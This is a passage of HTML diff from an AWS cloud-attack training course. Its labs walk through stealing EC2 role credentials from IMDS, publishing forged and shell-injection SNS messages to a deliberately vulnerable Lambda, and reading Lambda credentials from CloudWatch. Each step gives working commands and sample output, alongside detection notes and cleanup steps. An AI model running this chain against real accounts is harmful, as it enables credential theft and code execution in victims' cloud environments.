+  --message '{"action":"processOrder","orderId":"1337","customer":"attacker","amount":0}' \
+  --profile stolen</div>
+            <div class="terminal-output">{
+    "MessageId": "a1b2c3d4-e5f6-7890-abcd-1234567890ef"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Check CloudWatch Logs to confirm the Lambda function was triggered by the published message. The log output shows our injected <code>orderId: 1337</code> was processed, confirming successful Lambda invocation via SNS publish.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws logs tail /aws/lambda/order-processor --since 2m --profile stolen</div>
+            <div class="terminal-output">2024-01-15T10:32:15.123Z START RequestId: 7f8a9b0c-1234-5678-abcd-ef0123456789
+2024-01-15T10:32:15.456Z INFO Processing order: 1337
+2024-01-15T10:32:15.602Z INFO Customer: attacker
+2024-01-15T10:32:15.789Z INFO Amount: 0
+2024-01-15T10:32:15.890Z INFO Order processed successfully
+2024-01-15T10:32:16.001Z END RequestId: 7f8a9b0c-1234-5678-abcd-ef0123456789
+2024-01-15T10:32:16.001Z REPORT Duration: 878ms  Billed Duration: 900ms  Memory Size: 128 MB</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Stolen EC2 Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">List Topics + ARNs</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Inspect Policy + Subscriptions</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Publish Payload</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Lambda Triggered</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> <code>sns:Publish</code> IS logged to CloudTrail. Look for <code>Publish</code> events where the <code>userIdentity</code> is an EC2 assumed-role rather than a recognized service principal. Also watch for <code>sns:ListSubscriptionsByTopic</code> and <code>sns:GetTopicAttributes</code> as enumeration precursors. MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1648/" target="_blank">T1648 — Serverless Execution</a>.
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>No persistent resources are created in this lab — SNS publish is a one-time event</li>
+      <li>If the Lambda function created any database records or S3 objects as part of order processing, review and remove them through the Lambda function's downstream effects</li>
+      <li>Remove the <code>stolen</code> profile from <code>~/.aws/credentials</code> and <code>~/.aws/config</code></li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- Lab 5: Cross-Service Pivot Chain (EC2 → SNS → Lambda) -->
+<div class="lab-walkthrough-content" id="M06-L05-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Chain IMDS credential theft through SNS message publishing to achieve code execution inside a Lambda function, demonstrating a full cross-service pivot from EC2 to serverless.
+  </div>
+
+  <div class="lab-prereqs">
+    <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completion of M06-L01 through M06-L04 — you should understand IMDS credential theft, role assumption, and SNS topic enumeration before attempting this chained lab</li>
+      <li>Shell access on the target EC2 instance with IMDSv1 or IMDSv2 access (hop-limit 2)</li>
+      <li><code>curl</code>, <code>jq</code>, and <code>aws</code> CLI installed on the target EC2 instance or your attacker machine</li>
+      <li>Lab environment must have a deployed <code>data-pipeline-trigger</code> SNS topic with a vulnerable Lambda (<code>processor</code>) subscribed — this Lambda intentionally passes SNS message content to a shell execution function to simulate an injection vulnerability</li>
+      <li>CloudWatch Logs read access (<code>logs:DescribeLogStreams</code>, <code>logs:GetLogEvents</code>) for the EC2 role</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <span class="step-num">1</span>
+      <div class="step-content">
+        <div class="step-desc">Steal EC2 instance role credentials via IMDS in a single automated script. This combines the role name discovery and credential extraction from L01 into a chained sequence using <code>jq</code> for JSON parsing. These credentials become our initial foothold for the entire chain.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)</div>
+            <div class="terminal-cmd">$ CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)</div>
+            <div class="terminal-cmd">$ export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .AccessKeyId)</div>
+            <div class="terminal-cmd">$ export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .SecretAccessKey)</div>
+            <div class="terminal-cmd">$ export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Token)</div>
+            <div class="terminal-cmd">$ aws sts get-caller-identity --query 'Arn' --output text</div>
+            <div class="terminal-output">arn:aws:sts::123456789012:assumed-role/EC2-Admin-Role/i-0abc123def456</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">2</span>
+      <div class="step-content">
+        <div class="step-desc">Enumerate SNS topics using the stolen EC2 role credentials. The AWS CLI picks up the credentials from the environment variables set in step 1. Note that we are calling AWS APIs directly using the instance role — no named profile needed in this chained approach.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sns list-topics --query 'Topics[*].TopicArn' --output table</div>
+            <div class="terminal-output">---------------------------------------------------------------
+|                        ListTopics                           |
++-------------------------------------------------------------+
+|  arn:aws:sns:us-east-1:123456789012:process-orders          |
+|  arn:aws:sns:us-east-1:123456789012:user-notifications      |
+|  arn:aws:sns:us-east-1:123456789012:data-pipeline-trigger   |
++-------------------------------------------------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">3</span>
+      <div class="step-content">
+        <div class="step-desc">Identify which topic has a Lambda subscriber — this is the bridge from SNS messaging to code execution. Verify subscription state is <code>Confirmed</code> before attempting to publish. The <code>data-pipeline-trigger</code> topic with a Lambda function and a dead-letter SQS queue subscribed is our target.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sns list-subscriptions-by-topic \
+  --topic-arn arn:aws:sns:us-east-1:123456789012:data-pipeline-trigger \
+  --query 'Subscriptions[*].[Protocol,Endpoint]' --output table</div>
+            <div class="terminal-output">---------------------------------------------------------------------
+|                    ListSubscriptionsByTopic                        |
++---------+---------------------------------------------------------+
+|  lambda |  arn:aws:lambda:us-east-1:123456789012:function:processor |
+|  sqs    |  arn:aws:sqs:us-east-1:123456789012:pipeline-dlq          |
++-------------------------------------------------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">Publish a crafted injection payload to the topic using the full topic ARN. The vulnerable <code>processor</code> Lambda passes the message's <code>cmd</code> field directly to a shell execution call without sanitization. The SNS service is the delivery mechanism, but the vulnerability lives in the Lambda code itself — a server-side injection via the messaging layer.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sns publish \
+  --topic-arn arn:aws:sns:us-east-1:123456789012:data-pipeline-trigger \
+  --message '{"cmd":"id && cat /etc/passwd && env | grep AWS"}'</div>
+            <div class="terminal-output">{
+    "MessageId": "b2c3d4e5-f678-9012-abcd-ef1234567890"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Read the Lambda function's CloudWatch Logs to retrieve the command output. Get the most recent log stream first, then pull log events. The output confirms code execution inside Lambda — note that Lambda runs with its own IAM execution role, which may have different (potentially higher) permissions than the EC2 role used to trigger this chain.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ LOG_STREAM=$(aws logs describe-log-streams \
+  --log-group-name /aws/lambda/processor \
+  --order-by LastEventTime --descending \
+  --query 'logStreams[0].logStreamName' --output text)</div>
+            <div class="terminal-cmd">$ aws logs get-log-events \
+  --log-group-name /aws/lambda/processor \
+  --log-stream-name "$LOG_STREAM" \
+  --limit 20 \
+  --query 'events[*].message' --output text</div>
+            <div class="terminal-output">START RequestId: c3d4e5f6-7890-abcd-ef12-345678901234
+INFO: Processing command: id && cat /etc/passwd && env | grep AWS
+uid=993(sbx_user1051) gid=990(sbx_user1051) groups=990(sbx_user1051)
+root:x:0:0:root:/root:/bin/bash
+sbx_user1051:x:993:990::/home/sbx_user1051:/bin/bash
+AWS_LAMBDA_FUNCTION_NAME=processor
+AWS_REGION=us-east-1
+AWS_ACCESS_KEY_ID=ASIAZQ3DLAMBDAEXECKEY
+AWS_SECRET_ACCESS_KEY=LambdaExecSecretEXAMPLE/K7MDENG
+AWS_SESSION_TOKEN=FwoGZXIvYXdzLambda...truncated...
+END RequestId: c3d4e5f6-7890-abcd-ef12-345678901234
+REPORT Duration: 245.67 ms  Billed Duration: 300 ms  Memory Size: 128 MB</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">EC2 IMDS</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Steal EC2 Role Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Enumerate SNS</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Publish Injection Payload</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Lambda RCE</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Steal Lambda Role Creds via CloudWatch</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> Multiple CloudTrail signals fire across this chain: <code>sns:ListTopics</code>, <code>sns:ListSubscriptionsByTopic</code>, and <code>sns:Publish</code> all appear under the stolen EC2 role identity. Lambda invocation via SNS generates a <code>lambda:InvokeFunction</code> event (source: sns.amazonaws.com). <code>logs:DescribeLogStreams</code> and <code>logs:GetLogEvents</code> by an EC2 role is anomalous. The full chain is detectable if alerts are configured on cross-service access patterns. MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1552/005/" target="_blank">T1552.005</a> (IMDS) + <a href="https://attack.mitre.org/techniques/T1648/" target="_blank">T1648</a> (Serverless Execution).
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>Unset the stolen credential environment variables: <code>unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN</code></li>
+      <li>The credentials are temporary STS tokens — they expire automatically per the <code>Expiration</code> field from step 1</li>
+      <li>No AWS resources were created — the SNS publish and Lambda invocation are ephemeral</li>
+      <li>If your Lambda invocation produced side effects (e.g., wrote to S3 or DynamoDB), review those downstream services and clean up any attacker-controlled records</li>
+    </ul>
+  </div>
+</div>
